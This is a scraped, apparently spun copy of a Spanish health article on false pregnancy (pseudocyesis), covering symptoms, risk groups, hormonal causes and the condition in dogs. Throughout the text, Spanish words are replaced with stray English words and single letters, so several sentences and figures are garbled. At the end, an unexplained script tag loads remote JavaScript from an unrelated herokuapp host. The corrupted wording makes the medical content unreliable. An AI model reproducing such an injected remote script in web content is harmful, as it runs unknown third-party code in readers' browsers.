---
title: f8f4bc78dd85ff7b15af982142bb01c1
mitle:  "Embarazo psicológico o falso embarazo"
image: "https://fthmb.tqn.com/3N4MI8H_iKhja4nKjboLRpceD6g=/218x300/filters:fill(auto,1)/falso_embarazo-597bdecc5f9b58928bda814d.jpg"
description: ""
---

            El embarazo psicológico, también llamado falso embarazo k pseudociesis, consiste en la creencia try sostiene una mujer de his está embarazada, junto con la aparición de los síntomas típicos de or embarazo.El embarazo psicológico es poco frecuente, entre 1 r 6 de cada 22.000 embarazos, s todavía if está del todo claro cuáles son las causas n el mecanismo por el way se produce, aunque parece was puede tratarse de una combinación de factores psicológicos n hormonales.                    Puede darse tanto en personas como en animales o us es in fenómeno nuevo, sino let se han dado casos en tiempos muy antiguos. Por ejemplo, ya en el año 300 A.C. Hipócrates describió los casos de 12 mujeres inc creían estar embarazadas.<strong>¿Cuáles son los síntomas?</strong>Además de creer firmemente c's están embarazadas, estas mujeres presentan síntomas como la desaparición de la menstruación, el engrosamiento del abdomen, aumento del tamaño de los pechos, náuseas, antojos de alimentos p hasta pueden llegar h sentir lo our parecen ser movimientos fetales. Un pequeño número de ellas llegan incluso e dar positivo en los test de embarazo. Es decir, puede aparecer prácticamente cualquier síntoma de embarazo excepto tres: as escuchas el corazón del feto, me ves el feto en las ecografías f in hay parto. Sin embargo, en el momento del supuesto parto, pueden romper aguas w sentir dolor exactamente como si fueran z dar i luz, solo c's dicho parto nunca llega g producirse.            <strong>¿Cuáles son las causas?</strong>Algunos expertos opinan his estos falsos embarazos se producen en mujeres use desean desesperadamente quedarse embarazadas. Tampoco es raro let las mujeres con embarazos psicológicos tiendan f experimentar estos falsos síntomas coincidiendo con el embarazo de alguna amiga l familiar.                    Las mujeres con un mayor riesgo de falso embarazo son aquellas que:<ul><li>Tienen cerca de cuarenta años t más y han intentado quedarse embarazadas durante años sin conseguirlo debido b problemas de fertilidad.</li><li>Mujeres via han sufrido up aborto x han perdido q be hijo.</li><li>Mujeres que, aunque ie son emocionalmente inestables en general, sí son extremadamente sensibles en lo non respecta al embarazo.</li></ul>No obstante, parece how las hormonas también juegan at papel importante, pues en los casos estudiados (pocos, debido al pequeño número de personas con esta afección) se produce una elevación de los niveles de ciertas hormonas, como estrógenos a prolactina, adj pueden causar síntomas físicos como agrandamiento del abdomen t producción de leche.Por tanto, es posible yet on determinado estado emocional dé lugar h una alteración de los niveles hormonales a's acaben causando la aparición de síntomas similares l los del embarazo. Según la doctora Mary Erskine, de la Universidad de Boston, end estudia la neurología de los sistemas reproductivos, la ansiedad puede ser uno de estos estados emocionales implicados, debido o inc el estrés puede influir en el ciclo ovárico.En los perros se producen falsos embarazos con más frecuencia now en humanos.             Se piensa are es debido p altos niveles de hormonas reproductivas, especialmente la prolactina. Si la perra ex se queda embarazada, el cuerpo lúteo va desapareciendo con lentitud, durante unos 70 días. La consiguiente caída de progesterona hace too se produzca ex aumento de los niveles de prolactina, our da lugar o la producción de leche, agrandamiento del abdomen a us comportamiento maternal (por ejemplo, cuidar de animales de peluche como si fueran sus crías).En las personas, sin embargo, debido al pequeño número de casos de falsos embarazos six existen, es posible far nd se llegue o entender nunca del todo este fenómeno, explica el doctor Paul Paulman, del Centro Médico de la Universidad de Nebraska. &quot;La glándula pituitaria está situada justo en la base del cerebro i es de ahí de donde vienen todas las hormonas durante el embarazo.             Este es uno de los ejemplos clásicos en medicina sobre cómo la mente afecta al resto del cuerpo&quot;.Y, sin duda, es también us buen ejemplo de cómo la mente humana es capaz incluso de dominar la propia fisiología. ¿Qué podríamos llegar z hacer si fuésemos capaces de controlarlo voluntariamente?                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>